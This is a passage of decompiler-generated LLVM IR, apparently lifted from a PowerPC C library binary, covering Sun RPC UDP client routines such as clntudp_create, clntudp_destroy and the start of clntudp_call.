  br i1 %v3_1000f7f0, label %dec_label_pc_1000f804, label %dec_label_pc_1000f7fc

dec_label_pc_1000f7fc:                            ; preds = %entry
  %v3_1000f7fc = icmp eq i32 %v0_1000f7ec, 0
  br i1 %v3_1000f7fc, label %dec_label_pc_1000f804, label %dec_label_pc_1000f830

dec_label_pc_1000f804:                            ; preds = %dec_label_pc_1000f7fc, %entry
  store i32 268498952, i32* @lr, align 4
  %v0_1000f804 = call i32 @__GI___rpc_thread_createerr()
  store i32 %v0_1000f804, i32* %r3.global-to-local, align 4
  store i32 %v0_1000f804, i32* @r29, align 4
  %v3_1000f810 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32 -15696) to i32*), align 4
  store i32 ptrtoint ([31 x i8]* @global_var_1001731c.388 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000f820.389 to i32), i32* @lr, align 4
  %v3_1000f81c = call i32 @__GI_fputs(i32 ptrtoint ([31 x i8]* @global_var_1001731c.388 to i32), i32 %v3_1000f810)
  store i32 %v3_1000f81c, i32* %r3.global-to-local, align 4
  store i32 12, i32* %r0.global-to-local, align 4
  %v1_1000f824 = load i32, i32* @r29, align 4
  %v2_1000f824 = add i32 %v1_1000f824, 8
  %v3_1000f824 = inttoptr i32 %v2_1000f824 to i32*
  store i32 12, i32* %v3_1000f824, align 4
  %v0_1000f828 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000f828 = load i32, i32* @r29, align 4
  %v2_1000f828 = inttoptr i32 %v1_1000f828 to i32*
  store i32 %v0_1000f828, i32* %v2_1000f828, align 4
  br label %dec_label_pc_1000f9b0

dec_label_pc_1000f830:                            ; preds = %dec_label_pc_1000f7fc
  %v0_1000f830 = load i32, i32* @r30, align 4
  %v1_1000f830 = add i32 %v0_1000f830, 2
  %v2_1000f830 = inttoptr i32 %v1_1000f830 to i16*
  %v3_1000f830 = load i16, i16* %v2_1000f830, align 2
  %v4_1000f830 = zext i16 %v3_1000f830 to i32
  store i32 %v4_1000f830, i32* %r0.global-to-local, align 4
  %v1_1000f834 = add i32 %v1_1000f7e0, 96
  %v2_1000f838 = add i32 %v1_1000f834, %v0_1000f7ec
  %v3_1000f83c = icmp eq i16 %v3_1000f830, 0
  %v2_1000f840 = add i32 %v0_1000f7ec, 88
  %v3_1000f840 = inttoptr i32 %v2_1000f840 to i32*
  store i32 %v2_1000f838, i32* %v3_1000f840, align 4
  br i1 %v3_1000f83c, label %dec_label_pc_1000f848, label %dec_label_pc_1000f868

dec_label_pc_1000f848:                            ; preds = %dec_label_pc_1000f830
  %v0_1000f848 = load i32, i32* @r30, align 4
  store i32 %v0_1000f848, i32* %r3.global-to-local, align 4
  %v0_1000f84c = load i32, i32* @r23, align 4
  %v0_1000f850 = load i32, i32* @r22, align 4
  store i32 268499036, i32* @lr, align 4
  %v5_1000f858 = call i32 @pmap_getport(i32 %v0_1000f848, i32 %v0_1000f84c, i32 %v0_1000f850, i32 17, i32 %v2_1000f838)
  %v6_1000f858 = trunc i32 %v5_1000f858 to i16
  store i32 %v5_1000f858, i32* %r3.global-to-local, align 4
  %v4_1000f85c = icmp eq i16 %v6_1000f858, 0
  br i1 %v4_1000f85c, label %dec_label_pc_1000f9b0, label %dec_label_pc_1000f864

dec_label_pc_1000f864:                            ; preds = %dec_label_pc_1000f848
  %v3_1000f864 = load i32, i32* @r30, align 4
  %v4_1000f864 = add i32 %v3_1000f864, 2
  %v5_1000f864 = inttoptr i32 %v4_1000f864 to i16*
  store i16 %v6_1000f858, i16* %v5_1000f864, align 2
  br label %dec_label_pc_1000f868

dec_label_pc_1000f868:                            ; preds = %dec_label_pc_1000f830, %dec_label_pc_1000f864
  %v0_1000f86c = load i32, i32* @r31, align 4
  %v1_1000f86c = load i32, i32* @r27, align 4
  %v2_1000f86c = add i32 %v1_1000f86c, 8
  %v3_1000f86c = inttoptr i32 %v2_1000f86c to i32*
  store i32 %v0_1000f86c, i32* %v3_1000f86c, align 4
  store i32 -1, i32* %r11.global-to-local, align 4
  %v1_1000f878 = load i32, i32* @r27, align 4
  %v2_1000f878 = add i32 %v1_1000f878, 4
  %v3_1000f878 = inttoptr i32 %v2_1000f878 to i32*
  store i32 ptrtoint (i32* @global_var_1002c1f4.390 to i32), i32* %v3_1000f878, align 4
  %v0_1000f87c = load i32, i32* @r31, align 4
  %v1_1000f87c = add i32 %v0_1000f87c, 8
  store i32 16, i32* %r0.global-to-local, align 4
  %v0_1000f890 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000f890 = add i32 %v0_1000f87c, 40
  %v3_1000f890 = inttoptr i32 %v2_1000f890 to i32*
  store i32 %v0_1000f890, i32* %v3_1000f890, align 4
  %v0_1000f894 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000f894 = load i32, i32* @r31, align 4
  %v2_1000f894 = add i32 %v1_1000f894, 36
  %v3_1000f894 = inttoptr i32 %v2_1000f894 to i32*
  store i32 %v0_1000f894, i32* %v3_1000f894, align 4
  %v0_1000f898 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000f898 = load i32, i32* @r31, align 4
  %v2_1000f898 = add i32 %v1_1000f898, 24
  %v3_1000f898 = inttoptr i32 %v2_1000f898 to i32*
  store i32 %v0_1000f898, i32* %v3_1000f898, align 4
  %v1_1000f89c = load i32, i32* @r31, align 4
  %v2_1000f89c = add i32 %v1_1000f89c, 92
  %v3_1000f89c = inttoptr i32 %v2_1000f89c to i32*
  store i32 %v1_1000f7e0, i32* %v3_1000f89c, align 4
  %v0_1000f8a0 = load i32, i32* @r31, align 4
  %v0_1000f8a4 = load i32, i32* %r25.global-to-local, align 4
  %v2_1000f8a4 = add i32 %v0_1000f8a0, 28
  %v3_1000f8a4 = inttoptr i32 %v2_1000f8a4 to i32*
  store i32 %v0_1000f8a4, i32* %v3_1000f8a4, align 4
  %v0_1000f8a8 = load i32, i32* @r26, align 4
  %v1_1000f8a8 = load i32, i32* @r31, align 4
  %v2_1000f8a8 = add i32 %v1_1000f8a8, 32
  %v3_1000f8a8 = inttoptr i32 %v2_1000f8a8 to i32*
  store i32 %v0_1000f8a8, i32* %v3_1000f8a8, align 4
  %v1_1000f8ac = load i32, i32* @r31, align 4
  %v2_1000f8ac = add i32 %v1_1000f8ac, 84
  %v3_1000f8ac = inttoptr i32 %v2_1000f8ac to i32*
  store i32 %v1_1000f7d0, i32* %v3_1000f8ac, align 4
  store i32 268499124, i32* @lr, align 4
  %v1_1000f8b0 = call i32 @_create_xid(i32 %v1_1000f87c)
  store i32 %v1_1000f8b0, i32* %r3.global-to-local, align 4
  %v0_1000f8b4 = load i32, i32* @r31, align 4
  %v1_1000f8b4 = add i32 %v0_1000f8b4, 88
  %v2_1000f8b4 = inttoptr i32 %v1_1000f8b4 to i32*
  %v3_1000f8b4 = load i32, i32* %v2_1000f8b4, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 %v1_1000f8b0, i32* %stack_var_-96, align 4
  %v0_1000f8c8 = load i32, i32* @r29, align 4
  store i32 %v0_1000f8c8, i32* %r3.global-to-local, align 4
  %v4_1000f8dc = inttoptr i32 %v0_1000f8c8 to i32*
  %v5_1000f8dc = call i32 @__GI_xdrmem_create(i32* %v4_1000f8dc, i32 %v3_1000f8b4, i32 %v1_1000f7d0, i32 0)
  %v0_1000f8e0 = load i32, i32* @r29, align 4
  store i32 %v0_1000f8e0, i32* %r3.global-to-local, align 4
  %v2_1000f8e4 = ptrtoint i32* %stack_var_-96 to i32
  store i32 268499180, i32* @lr, align 4
  %v2_1000f8e8 = inttoptr i32 %v0_1000f8e0 to i32*
  %v3_1000f8e8 = call i32 @__GI_xdr_callhdr(i32* %v2_1000f8e8, i32 %v2_1000f8e4)
  store i32 %v3_1000f8e8, i32* %r3.global-to-local, align 4
  %v3_1000f8ec = icmp eq i32 %v3_1000f8e8, 0
  br i1 %v3_1000f8ec, label %dec_label_pc_1000f9b0, label %dec_label_pc_1000f8f4

dec_label_pc_1000f8f4:                            ; preds = %dec_label_pc_1000f868
  %v0_1000f8f4 = load i32, i32* @r31, align 4
  %v1_1000f8f4 = add i32 %v0_1000f8f4, 60
  %v2_1000f8f4 = inttoptr i32 %v1_1000f8f4 to i32*
  %v3_1000f8f4 = load i32, i32* %v2_1000f8f4, align 4
  %v0_1000f8f8 = load i32, i32* @r29, align 4
  store i32 %v0_1000f8f8, i32* %r3.global-to-local, align 4
  %v1_1000f8fc = add i32 %v3_1000f8f4, 16
  %v2_1000f8fc = inttoptr i32 %v1_1000f8fc to i32*
  %v3_1000f8fc = load i32, i32* %v2_1000f8fc, align 4
  call void @__pseudo_call(i32 %v3_1000f8fc)
  %v0_1000f908 = load i32, i32* %r24.global-to-local, align 4
  %v1_1000f908 = inttoptr i32 %v0_1000f908 to i32*
  %v2_1000f908 = load i32, i32* %v1_1000f908, align 4
  store i32 %v2_1000f908, i32* %r0.global-to-local, align 4
  %v0_1000f90c = load i32, i32* %r3.global-to-local, align 4
  %v1_1000f90c = load i32, i32* @r31, align 4
  %v2_1000f90c = add i32 %v1_1000f90c, 80
  %v3_1000f90c = inttoptr i32 %v2_1000f90c to i32*
  store i32 %v0_1000f90c, i32* %v3_1000f90c, align 4
  %v0_1000f910 = load i32, i32* %r0.global-to-local, align 4
  %tmp10 = icmp sgt i32 %v0_1000f910, -1
  br i1 %tmp10, label %dec_label_pc_1000f998, label %dec_label_pc_1000f918

dec_label_pc_1000f918:                            ; preds = %dec_label_pc_1000f8f4
  store i32 1, i32* @r30, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 1, i32* %stack_var_-104, align 4
  store i32 268499248, i32* @lr, align 4
  %v3_1000f92c = call i32 @socket(i32 2, i32 2, i32 17)
  store i32 %v3_1000f92c, i32* %r3.global-to-local, align 4
  %v1_1000f934 = load i32, i32* %r24.global-to-local, align 4
  %v2_1000f934 = inttoptr i32 %v1_1000f934 to i32*
  store i32 %v3_1000f92c, i32* %v2_1000f934, align 4
  %tmp11 = icmp sgt i32 %v3_1000f92c, -1
  br i1 %tmp11, label %dec_label_pc_1000f95c, label %dec_label_pc_1000f93c

dec_label_pc_1000f93c:                            ; preds = %dec_label_pc_1000f918
  store i32 ptrtoint (i32* @global_var_1000f940.391 to i32), i32* @lr, align 4
  %v0_1000f93c = call i32 @__GI___rpc_thread_createerr()
  store i32 %v0_1000f93c, i32* %r3.global-to-local, align 4
  store i32 12, i32* %r0.global-to-local, align 4
  %v2_1000f944 = inttoptr i32 %v0_1000f93c to i32*
  store i32 12, i32* %v2_1000f944, align 4
  %v0_1000f94c = call i32 @__errno_location()
  store i32 %v0_1000f94c, i32* %r3.global-to-local, align 4
  %v1_1000f950 = inttoptr i32 %v0_1000f94c to i32*
  %v2_1000f950 = load i32, i32* %v1_1000f950, align 4
  store i32 %v2_1000f950, i32* %r0.global-to-local, align 4
  %v2_1000f954 = add i32 %v0_1000f93c, 8
  %v3_1000f954 = inttoptr i32 %v2_1000f954 to i32*
  store i32 %v2_1000f950, i32* %v3_1000f954, align 4
  br label %dec_label_pc_1000f9b0

dec_label_pc_1000f95c:                            ; preds = %dec_label_pc_1000f918
  store i32 268499300, i32* @lr, align 4
  %v3_1000f960 = call i32 @__GI_bindresvport(i32 %v3_1000f92c, i16* null)
  store i32 %v3_1000f960, i32* %r3.global-to-local, align 4
  %v0_1000f964 = load i32, i32* %r24.global-to-local, align 4
  %v1_1000f964 = inttoptr i32 %v0_1000f964 to i32*
  %v2_1000f964 = load i32, i32* %v1_1000f964, align 4
  store i32 %v2_1000f964, i32* %r3.global-to-local, align 4
  %v2_1000f96c = ptrtoint i32* %stack_var_-104 to i32
  store i32 268499324, i32* @lr, align 4
  %v3_1000f978 = call i32 @ioctl(i32 %v2_1000f964, i32 -2147195266, i32 %v2_1000f96c)
  store i32 %v3_1000f978, i32* %r3.global-to-local, align 4
  %v0_1000f97c = load i32, i32* %r24.global-to-local, align 4
  %v1_1000f97c = inttoptr i32 %v0_1000f97c to i32*
  %v2_1000f97c = load i32, i32* %v1_1000f97c, align 4
  store i32 %v2_1000f97c, i32* %r3.global-to-local, align 4
  %v2_1000f988 = ptrtoint i32* %stack_var_-100 to i32
  %v0_1000f990 = load i32, i32* @r30, align 4
  store i32 %v0_1000f990, i32* %stack_var_-100, align 4
  store i32 268499352, i32* @lr, align 4
  %v5_1000f994 = call i32 @__GI_setsockopt(i32 %v2_1000f97c, i32 0, i32 11, i32 %v2_1000f988, i32 4)
  store i32 %v5_1000f994, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000f998

dec_label_pc_1000f998:                            ; preds = %dec_label_pc_1000f8f4, %dec_label_pc_1000f95c
  %v0_1000f998 = load i32, i32* @r30, align 4
  %v1_1000f998 = load i32, i32* @r31, align 4
  %v2_1000f998 = add i32 %v1_1000f998, 4
  %v3_1000f998 = inttoptr i32 %v2_1000f998 to i32*
  store i32 %v0_1000f998, i32* %v3_1000f998, align 4
  %v0_1000f99c = load i32, i32* %r24.global-to-local, align 4
  %v1_1000f99c = inttoptr i32 %v0_1000f99c to i32*
  %v2_1000f99c = load i32, i32* %v1_1000f99c, align 4
  store i32 %v2_1000f99c, i32* %r0.global-to-local, align 4
  %v1_1000f9a0 = load i32, i32* @r31, align 4
  %v2_1000f9a0 = inttoptr i32 %v1_1000f9a0 to i32*
  store i32 %v2_1000f99c, i32* %v2_1000f9a0, align 4
  store i32 268499368, i32* @lr, align 4
  %v0_1000f9a4 = call i32 @authnone_create()
  store i32 %v0_1000f9a4, i32* %r3.global-to-local, align 4
  %v1_1000f9a8 = load i32, i32* @r27, align 4
  %v2_1000f9a8 = inttoptr i32 %v1_1000f9a8 to i32*
  store i32 %v0_1000f9a4, i32* %v2_1000f9a8, align 4
  br label %dec_label_pc_1000f9d4

dec_label_pc_1000f9b0:                            ; preds = %dec_label_pc_1000f868, %dec_label_pc_1000f848, %dec_label_pc_1000f93c, %dec_label_pc_1000f804
  %v0_1000f9b0 = load i32, i32* @r31, align 4
  %v3_1000f9b0 = icmp eq i32 %v0_1000f9b0, 0
  br i1 %v3_1000f9b0, label %dec_label_pc_1000f9c0, label %dec_label_pc_1000f9b8

dec_label_pc_1000f9b8:                            ; preds = %dec_label_pc_1000f9b0
  store i32 %v0_1000f9b0, i32* @r3, align 4
  store i32 268499392, i32* @lr, align 4
  %v0_1000f9bc = call i32 @free()
  store i32 %v0_1000f9bc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000f9c0

dec_label_pc_1000f9c0:                            ; preds = %dec_label_pc_1000f9b0, %dec_label_pc_1000f9b8
  %v0_1000f9c0 = load i32, i32* @r27, align 4
  %v3_1000f9c0 = icmp eq i32 %v0_1000f9c0, 0
  br i1 %v3_1000f9c0, label %dec_label_pc_1000f9d4, label %dec_label_pc_1000f9c8

dec_label_pc_1000f9c8:                            ; preds = %dec_label_pc_1000f9c0
  store i32 %v0_1000f9c0, i32* @r3, align 4
  store i32 0, i32* @r27, align 4
  store i32 268499412, i32* @lr, align 4
  %v0_1000f9d0 = call i32 @free()
  store i32 %v0_1000f9d0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000f9d4

dec_label_pc_1000f9d4:                            ; preds = %dec_label_pc_1000f9c0, %dec_label_pc_1000f998, %dec_label_pc_1000f9c8
  store i32 %v0_1000f798, i32* %r0.global-to-local, align 4
  %v0_1000f9d8 = load i32, i32* @r27, align 4
  store i32 %v0_1000f9d8, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000f9d8

; uselistorder directives
  uselistorder i32 %v3_1000f92c, { 2, 0, 1, 3 }
  uselistorder i32 %v5_1000f858, { 1, 0 }
  uselistorder i32 %v0_1000f7ec, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v1_1000f7e0, { 1, 0, 2 }
  uselistorder i32 %v1_1000f7d0, { 0, 2, 1 }
  uselistorder i32* %stack_var_-96, { 1, 0 }
  uselistorder i32* %stack_var_-104, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 8, 1, 9, 5, 7, 10, 11, 12, 6, 13, 3, 14, 15, 16, 17, 2, 19, 18, 4, 20, 21, 22, 23, 24, 26, 25, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 0, 3, 2, 1 }
  uselistorder i32 -2147195266, { 2, 0, 1 }
  uselistorder i32 84, { 15, 4, 14, 10, 3, 2, 1, 0, 13, 5, 6, 7, 8, 9, 11, 12 }
  uselistorder label %dec_label_pc_1000f9d4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000f9c0, { 1, 0 }
  uselistorder label %dec_label_pc_1000f9b0, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1000f998, { 1, 0 }
  uselistorder label %dec_label_pc_1000f868, { 1, 0 }
}

define i32 @__GI_clntudp_create(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  store i32 8800, i32* @r8, align 4
  %v2_1000f9fc = load i32, i32* %arg1, align 4
  %v1_1000fa00 = add i32 %tmp, 4
  %v2_1000fa00 = inttoptr i32 %v1_1000fa00 to i32*
  %v3_1000fa00 = load i32, i32* %v2_1000fa00, align 4
  store i32 %v3_1000fa00, i32* @r10, align 4
  store i32 %v2_1000f9fc, i32* %stack_var_-8, align 4
  %v4_1000fa08 = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v4_1000fa08, i32* @r6, align 4
  store i32 8800, i32* @r9, align 4
  store i32 268499480, i32* @lr, align 4
  %v3_1000fa14 = call i32 @__GI_clntudp_bufcreate(i32 %v4_1000fa08, i32 8800, i32 8800)
  ret i32 %v3_1000fa14

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @clntudp_destroy(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r30, align 4
  %v1_1000fa3c = add i32 %arg1, 8
  %v2_1000fa3c = inttoptr i32 %v1_1000fa3c to i32*
  %v3_1000fa3c = load i32, i32* %v2_1000fa3c, align 4
  store i32 %v3_1000fa3c, i32* @r31, align 4
  %v1_1000fa40 = add i32 %v3_1000fa3c, 4
  %v2_1000fa40 = inttoptr i32 %v1_1000fa40 to i32*
  %v3_1000fa40 = load i32, i32* %v2_1000fa40, align 4
  %v3_1000fa44 = icmp eq i32 %v3_1000fa40, 0
  br i1 %v3_1000fa44, label %dec_label_pc_1000fa54, label %dec_label_pc_1000fa4c

dec_label_pc_1000fa4c:                            ; preds = %entry
  %v1_1000fa4c = inttoptr i32 %v3_1000fa3c to i32*
  %v2_1000fa4c = load i32, i32* %v1_1000fa4c, align 4
  store i32 268499540, i32* @lr, align 4
  %v1_1000fa50 = call i32 @__libc_close(i32 %v2_1000fa4c)
  %v0_1000fa54.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000fa54

dec_label_pc_1000fa54:                            ; preds = %entry, %dec_label_pc_1000fa4c
  %v0_1000fa54 = phi i32 [ %v3_1000fa3c, %entry ], [ %v0_1000fa54.pre, %dec_label_pc_1000fa4c ]
  %v1_1000fa54 = add i32 %v0_1000fa54, 60
  %v2_1000fa54 = inttoptr i32 %v1_1000fa54 to i32*
  %v3_1000fa54 = load i32, i32* %v2_1000fa54, align 4
  %v1_1000fa5c = add i32 %v3_1000fa54, 28
  %v2_1000fa5c = inttoptr i32 %v1_1000fa5c to i32*
  %v3_1000fa5c = load i32, i32* %v2_1000fa5c, align 4
  %v3_1000fa60 = icmp eq i32 %v3_1000fa5c, 0
  br i1 %v3_1000fa60, label %dec_label_pc_1000fa70, label %dec_label_pc_1000fa68

dec_label_pc_1000fa68:                            ; preds = %dec_label_pc_1000fa54
  call void @__pseudo_call(i32 %v3_1000fa5c)
  %v0_1000fa70.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000fa70

dec_label_pc_1000fa70:                            ; preds = %dec_label_pc_1000fa54, %dec_label_pc_1000fa68
  %v0_1000fa70 = phi i32 [ %v0_1000fa54, %dec_label_pc_1000fa54 ], [ %v0_1000fa70.pre, %dec_label_pc_1000fa68 ]
  store i32 %v0_1000fa70, i32* @r3, align 4
  store i32 268499576, i32* @lr, align 4
  %v0_1000fa74 = call i32 @free()
  %v0_1000fa78 = load i32, i32* @r30, align 4
  store i32 %v0_1000fa78, i32* @r3, align 4
  store i32 268499584, i32* @lr, align 4
  %v0_1000fa7c = call i32 @free()
  ret i32 %v0_1000fa7c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_1000fa70, { 1, 0 }
  uselistorder label %dec_label_pc_1000fa54, { 1, 0 }
}

define i32 @clntudp_call(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r16.global-to-local = alloca i32, align 4
  %r17.global-to-local = alloca i32, align 4
  %r18.global-to-local = alloca i32, align 4
  %r19.global-to-local = alloca i32, align 4
  %r20.global-to-local = alloca i32, align 4
  %r21.global-to-local = alloca i32, align 4
  %r22.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg7, i32* %r9.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %tmp33 = call i32 @__decompiler_undefined_function_0()
  %tmp42 = call i16 @__decompiler_undefined_function_3()
  %tmp43 = call i16 @__decompiler_undefined_function_3()
  %stack_var_-8948 = alloca i32, align 4
  %stack_var_-9004 = alloca i32, align 4
  %stack_var_-9064 = alloca i32, align 4
  %stack_var_-9036 = alloca i32, align 4
  %stack_var_-9020 = alloca i16, align 2
  %stack_var_-8980 = alloca i32, align 4
  %stack_var_-9044 = alloca i32, align 4
  %stack_var_-8900 = alloca i32, align 4
  %stack_var_-9060 = alloca i32, align 4
  %stack_var_-8936 = alloca i32, align 4
  %stack_var_-9072 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_1000fa94 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_1000fa94, i32* %stack_var_-9072, align 4
  store i32 %tmp, i32* %r23.global-to-local, align 4
  %v1_1000fab4 = add i32 %arg7, 4
  %v2_1000fab4 = inttoptr i32 %v1_1000fab4 to i32*
  %v3_1000fab4 = load i32, i32* %v2_1000fab4, align 4
  store i32 %arg3, i32* %r20.global-to-local, align 4
  %v1_1000fabc = add i32 %tmp, 8
  %v2_1000fabc = inttoptr i32 %v1_1000fabc to i32*
  %v3_1000fabc = load i32, i32* %v2_1000fabc, align 4
  store i32 %v3_1000fabc, i32* @r30, align 4
  %v1_1000fac4 = inttoptr i32 %arg7 to i32*
  %v2_1000fac4 = load i32, i32* %v1_1000fac4, align 4
  store i32 %v2_1000fac4, i32* %r9.global-to-local, align 4
  %v1_1000facc = add i32 %v3_1000fabc, 32
  %v2_1000facc = inttoptr i32 %v1_1000facc to i32*
  %v3_1000facc = load i32, i32* %v2_1000facc, align 4
  store i32 %v3_1000fab4, i32* %r22.global-to-local, align 4
  %v1_1000fad4 = add i32 %v3_1000fabc, 40
  %v2_1000fad4 = inttoptr i32 %v1_1000fad4 to i32*
  %v3_1000fad4 = load i32, i32* %v2_1000fad4, align 4
  store i32 %v2_1000fac4, i32* %r21.global-to-local, align 4
  %v2_1000fadc = sdiv i32 %v3_1000facc, 1000
  %v1_1000fae0 = add i32 %v3_1000fabc, 28
  %v2_1000fae0 = inttoptr i32 %v1_1000fae0 to i32*
  %v3_1000fae0 = load i32, i32* %v2_1000fae0, align 4
  %v3_1000fae4 = icmp eq i32 %v3_1000fad4, -1
  %v1_1000faec = mul i32 %v3_1000fae0, 1000
  %v2_1000faf0 = add i32 %v1_1000faec, %v2_1000fadc
  store i32 %v2_1000faf0, i32* %r16.global-to-local, align 4
  br i1 %v3_1000fae4, label %dec_label_pc_1000fb30, label %dec_label_pc_1000fb28

dec_label_pc_1000fafc:                            ; preds = %dec_label_pc_1000fbfc
  %v0_1000fafc = call i32 @__errno_location()
  store i32 %v0_1000fafc, i32* %r3.global-to-local, align 4
  %v1_1000fb04 = inttoptr i32 %v0_1000fafc to i32*
  %v2_1000fb04 = load i32, i32* %v1_1000fb04, align 4
  store i32 %v2_1000fb04, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000fb1c

dec_label_pc_1000fb14:                            ; preds = %dec_label_pc_1000fd90, %dec_label_pc_1000ff2c
  br label %dec_label_pc_1000fb1c

dec_label_pc_1000fb1c:                            ; preds = %dec_label_pc_1000fafc, %dec_label_pc_1000fb14
  %storemerge = phi i32 [ 3, %dec_label_pc_1000fafc ], [ 4, %dec_label_pc_1000fb14 ]
  %v0_1000fb1c = phi i32 [ 3, %dec_label_pc_1000fafc ], [ 4, %dec_label_pc_1000fb14 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v1_1000fb1c = load i32, i32* @r30, align 4
  %v2_1000fb1c = add i32 %v1_1000fb1c, 44
  %v3_1000fb1c = inttoptr i32 %v2_1000fb1c to i32*
  store i32 %v0_1000fb1c, i32* %v3_1000fb1c, align 4
  %v0_1000fb20 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000fb20 = load i32, i32* @r30, align 4
  %v2_1000fb20 = add i32 %v1_1000fb20, 48
  %v3_1000fb20 = inttoptr i32 %v2_1000fb20 to i32*
  store i32 %v0_1000fb20, i32* %v3_1000fb20, align 4
  br label %dec_label_pc_10010030

dec_label_pc_1000fb28:                            ; preds = %entry
  %v1_1000fb28 = add i32 %v3_1000fabc, 36
  %v2_1000fb28 = inttoptr i32 %v1_1000fb28 to i32*
  %v3_1000fb28 = load i32, i32* %v2_1000fb28, align 4
  store i32 %v3_1000fb28, i32* %r21.global-to-local, align 4
  store i32 %v3_1000fad4, i32* %r22.global-to-local, align 4
  br label %dec_label_pc_1000fb30

dec_label_pc_1000fb30:                            ; preds = %entry, %dec_label_pc_1000fb28
  store i32 0, i32* %r19.global-to-local, align 4
  store i32 2, i32* %r17.global-to-local, align 4
  store i32 0, i32* %r24.global-to-local, align 4
  store i32 0, i32* %r18.global-to-local, align 4
  %v2_1000fc34 = ptrtoint i32* %stack_var_-8936 to i32
  %v2_1000fc60 = ptrtoint i32* %stack_var_-9060 to i32
  %v4_1000fda0 = zext i16 %tmp42 to i32
  %v1_1000fda4 = and i32 %v4_1000fda0, 8
  %v3_1000fda4 = icmp eq i32 %v1_1000fda4, 0
  %v2_1000fef4 = ptrtoint i32* %stack_var_-9036 to i32
  %v2_1000fefc = ptrtoint i32* %stack_var_-9064 to i32
  %v2_1000fdc0 = ptrtoint i32* %stack_var_-8900 to i32
  %v2_1000fdc8 = ptrtoint i16* %stack_var_-9020 to i32
  %v2_1000fc9c = ptrtoint i32* %stack_var_-9044 to i32
  %v2_1000fd04 = ptrtoint i32* %stack_var_-8980 to i32
  %tmp83 = urem i16 %tmp43, 2
  %v1_1000fce4 = zext i16 %tmp83 to i32
  %v3_1000fce4 = icmp eq i16 %tmp83, 0
  %v2_1000ff58 = ptrtoint i32* %stack_var_-9004 to i32
  %v2_1000ff6c = ptrtoint i32* %stack_var_-8948 to i32
  br label %dec_label_pc_1000fb40

dec_label_pc_1000fb40:                            ; preds = %dec_label_pc_1001001c, %dec_label_pc_1000fb30
  %v1_1000fb54 = phi i32 [ %v0_1000fb44.pre, %dec_label_pc_1001001c ], [ %v3_1000fabc, %dec_label_pc_1000fb30 ]
  %v0_1000fb40 = phi i32 [ %v0_1000fb40.pre, %dec_label_pc_1001001c ], [ %arg3, %dec_label_pc_1000fb30 ]
  %v3_1000fb40 = icmp eq i32 %v0_1000fb40, 0
  %v1_1000fb44 = add i32 %v1_1000fb54, 56
  store i32 %v1_1000fb44, i32* @r26, align 4
  br i1 %v3_1000fb40, label %dec_label_pc_1000fc30, label %dec_label_pc_1000fb4c

dec_label_pc_1000fb4c:                            ; preds = %dec_label_pc_1000fb40
  %v1_1000fb50 = add i32 %v1_1000fb54, 60
  %v2_1000fb50 = inttoptr i32 %v1_1000fb50 to i32*
  %v3_1000fb50 = load i32, i32* %v2_1000fb50, align 4
  store i32 %v3_1000fb50, i32* %r9.global-to-local, align 4
  %v3_1000fb54 = inttoptr i32 %v1_1000fb44 to i32*
  store i32 0, i32* %v3_1000fb54, align 4
  %v0_1000fb58 = load i32, i32* @r26, align 4
  store i32 %v0_1000fb58, i32* %r3.global-to-local, align 4
  %v0_1000fb60 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000fb60 = add i32 %v0_1000fb60, 20
  %v2_1000fb60 = inttoptr i32 %v1_1000fb60 to i32*
  %v3_1000fb60 = load i32, i32* %v2_1000fb60, align 4
  store i32 %v3_1000fb60, i32* %r9.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_1000fb60)
  %v0_1000fb6c = load i32, i32* @r30, align 4
  %v1_1000fb6c = add i32 %v0_1000fb6c, 88
  %v2_1000fb6c = inttoptr i32 %v1_1000fb6c to i32*
  %v3_1000fb6c = load i32, i32* %v2_1000fb6c, align 4
  %v0_1000fb70 = load i32, i32* @r26, align 4
  store i32 %v0_1000fb70, i32* %r3.global-to-local, align 4
  %v1_1000fb78 = inttoptr i32 %v3_1000fb6c to i32*
  %v2_1000fb78 = load i32, i32* %v1_1000fb78, align 4
  %v1_1000fb7c = add i32 %v2_1000fb78, 1
  store i32 %v1_1000fb7c, i32* %r9.global-to-local, align 4
